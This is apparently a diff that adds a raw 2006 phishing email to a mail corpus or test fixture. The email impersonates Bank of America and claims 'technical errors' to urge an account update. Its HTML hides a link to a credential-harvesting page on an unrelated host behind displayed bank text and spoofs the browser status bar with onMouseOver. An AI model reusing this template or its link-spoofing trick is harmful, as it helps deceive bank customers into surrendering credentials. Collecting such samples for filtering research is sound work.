@@ -1,0 +1,56 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <customerservice@bankofamerica.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id A19E8469A1
+ for <user@login.example.com>; Fri,  6 Oct 2006 20:19:33 -0400 (EDT)
+Received: from mail.com (LONDON14-1168107353.sdsl.bell.ca [69.159.231.89])
+ by mail.example.org (Postfix) with SMTP id 8B4B96CCEC7
+ for <user@example.com>; Fri,  6 Oct 2006 20:19:33 -0400 (EDT)
+From: "Bank of America" <customerservice@bankofamerica.com>
+Subject: Update your Bank of America account
+Date: Fri, 6 Oct 2006 20:18:07 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20061007001933.8B4B96CCEC7@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 388
+
+				<body bgcolor="#ffffff">
+
+				<p align="left">
+				<img border="0" img src="http://www.bankofamerica.com/global/mvc_objects/images/mhd_reg_logo.gif"  width="250" height="69"></p>
+				<p align="left"><font size="4">Dear Bank of America Client :</font></p>
+				<p align="left"><font face="Arial Narrow">We are encountered some tehnical 
+				errors in our database, Please update your 
+				profile .</font></p>
+<p align="left"><font face="Arial Narrow">You can access your profile at
+								<a 
+href="http://203-79-114-131.paradise.net.nz/bankofamerica.com/cgi-bin/secure/login/index.html"onMouseOver="status='https://www.bankofamerica.com'; return true" 
+onMouseOut="status='';return 
+true">https://www.bankofamerica.com</a>
+							</font> </p>
+				<p align="left"><font face="Arial Narrow">This process is mandatory, and if not completed within the nearest time your 
+    account </font></p>
+				<p align="left"><font face="Arial Narrow">may be subject for temporary suspension. </font></p>
+				<p align="left"><font face="Arial Narrow">For help please contact Bank of America Customer 
+							Service immediately by</font></p>
+<p align="left"><font face="Arial Narrow">email at
+							<a onclick="return top.js.OpenExtLink(window,event,this)" target="_blank" href="mailto:customerservice@bankofamerica.com">
+							customerservice@bankofamerica<WBR>.com</a>&nbsp; or call us 
+							at 1-800-552-7302 . <br>
+							&nbsp;</font></p>
+							<p align="left"><font face="Arial Narrow">Thank you for using
+							<a onclick="return top.js.OpenExtLink(window,event,this)" target="_blank" href="http://bankofamerica.com">
+							bankofamerica.com</a>!</font><br>
+							-----------------------------------------------------------------------------------
